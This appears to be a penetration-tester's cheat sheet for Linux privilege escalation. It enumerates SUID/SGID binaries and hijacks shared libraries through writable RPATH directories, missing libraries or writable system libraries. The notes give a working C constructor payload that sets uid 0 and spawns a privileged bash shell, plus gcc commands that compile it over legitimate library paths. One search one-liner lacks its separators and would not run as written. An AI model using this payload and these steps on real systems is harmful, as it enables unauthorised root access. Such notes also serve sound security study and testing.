# Permissions
**Enumeration**
```shell
#--finds SETUID binaries 
find / -perm -4000 -type f 2>/dev/null 
```
```shell
#--finds SETGID binaries 
find / -perm -2000 -type f 2>/dev/null
```
```shell
#--finds both SETUID and SETGID binaries 
find / -perm -6000 -type f 2>/dev/null 
```
**Analyzing Binary Dependencies**
```
ldd /opt/binary/path 
```

**Indicators of vulnerabilities** 
- non-standard library names 
- libraries loaded from unusual paths 
- missing libraries not found
### Situations 
#### RPATH Writable Directory 

**Step 1** 

```bash prompt:kali 
readelf -d /path/to/suid-binary | grep -iE "rpath|runpath"
#e.g.(RPATH) Library rpath: [/opt/app/lib]
ls -la /opt/app/lib
```

**Step 2** Find out which library to fake 
- Binaries contain libraries 
```
ldd /path/to/suid/binary
```

 **Step 3:Write malicious library**

```C tmp:name
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

```

```bash prompt:kali 
gcc -shared -fPIC -nostartfiles -o /opt/app/lib/libapp.so.1 /tmp/hijack.c 
# /tmp/hijack.c is the source code 
# /opt/app/lib/libapp.so.1 is output filename and path 
```
**Step 4:Execute Binary **
```bash prompt:kali 
/path/to/suid-binary
```

#### Missing Library 

1. **Search libraries that are missing **
```bash
find / -perm -u=s -type f 2>/dev/null | while read f; do missing=$(ldd "$f" 2>/dev/null | grep "not found") [ -n "$missing" ] && echo "$f: $missing" done
```
2. **Use GCC to compile missing library 
```
gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so.1 /tmp/hijack.c 

```

#### Library Overwrite 
1. Find library with misconfiguration 
```
find /lib /usr/lib /lib64 /usr/lib64 -type f -name "*.so*" -writable 2>/dev/null
```
2. Backup original 
```
cp /usr/lib/libvulnerable.so.1 /tmp/libvulnerable.so.1.bak 
```
3. Replace with malicious version
```
gcc -shared -fPIC -nostartfiles -o /usr/lib/libvulnerable.so.1 /tmp/hijack.c
```
